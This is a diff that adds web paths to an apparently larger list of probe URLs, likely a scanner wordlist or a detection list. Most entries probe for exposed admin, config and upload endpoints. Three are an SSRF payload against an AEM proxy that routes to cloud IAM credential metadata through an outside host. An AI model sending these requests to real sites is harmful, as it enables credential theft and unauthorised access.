@@ -48,3 +48,13 @@
 /app_dev.php/_profiler/open?file=app/config/parameters.yml
 /.tugboat
 //wp-admin/setup-config.php?step=1
+/secure/WBSGanttManageScheduleJobAction.jspa;
+/system/config_menu.htm
+//libs/cq/contentinsight/proxy/reportingservices.json.GET.servlet.a.11.htm.svg?url=https://aws.osoro.zip/latest/meta-data/iam/security-credentials/ManagedServicesBigBearInstance&23/apil.omniture.com/a&q=a
+/app/libs/cq/contentinsight/proxy/reportingservices.json.GET.servlet.a.11.htm.svg?url=http://aws.osoro.zip/latest/meta-data/iam/security-credentials/ManagedServicesBigBearInstance&23/apil.omniture.com/a&q=a
+/api/libs/cq/contentinsight/proxy/reportingservices.json.GET.servlet.a.11.htm.svg?url=http://aws.osoro.zip/latest/meta-data/iam/security-credentials/ManagedServicesBigBearInstance&23/apil.omniture.com/a&q=a
+/admin/user_getUserInfoByUserName.action?userName=system
+/jquery-file-upload/server/php/
+/admin/weichatcfg/getsysteminfo
+/runtime/admin_log_conf.cache
+/cgi-bin/gateway/agentinfo
